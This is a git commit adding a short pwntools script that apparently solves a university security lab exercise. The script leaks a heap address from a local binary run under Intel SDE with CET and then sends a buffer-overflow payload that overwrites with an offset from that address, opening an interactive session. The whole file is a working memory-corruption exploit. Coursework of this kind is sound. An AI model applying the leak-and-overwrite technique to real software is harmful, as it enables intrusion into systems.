9009c58ff316f5958a4ee0d6c080c846fbed05f1
surtexx <robert-mihai.gheorghe@s.unibuc.ro>
2025-01-10 11:52:30 +0200

    Solve lab5 ex1

---
+++ lab5/solve_ex1.py
@@ -0,0 +1,21 @@
+#!/usr/bin/env python3
+from pwn import *
+
+target = process("./sdekit/sde64 -no-follow-child -cet -cet_output_file /dev/null -- ./bin/ex1", shell=True)
+gdb.attach(target)
+
+payload = b'PRINT\0' + cyclic(18) + b'\x90'
+target.send(payload)
+
+target.recvline()
+target.recvline()
+target.recvline()
+target.recvline()
+
+db_head_addr = u64(target.recvline().strip(b'> \n').ljust(8, b'\x00'))
+print(f"Leaked DB_HEAD address: {hex(db_head_addr)}")
+
+payload = cyclic(48) + p64(db_head_addr + 1124)
+target.send(payload)
+
+target.interactive()
